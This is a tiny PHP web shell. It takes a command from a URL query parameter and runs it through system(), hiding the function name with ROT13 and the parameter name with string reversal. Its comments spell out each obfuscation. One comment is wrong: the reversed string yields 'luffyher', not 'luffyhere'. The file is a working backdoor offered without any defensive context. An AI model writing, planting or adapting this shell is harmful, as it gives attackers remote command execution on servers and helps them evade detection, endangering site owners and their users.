<?php
$cmd = strrev("rehyfful"); // 'luffyhere' reversed
$input = $_GET[$cmd]; // Get the input from the 'luffyhere' parameter
$execute = str_rot13('flfgrz'); // Obfuscated 'system'
$execute($input); // Execute the command using the obfuscated 'system' function
?>
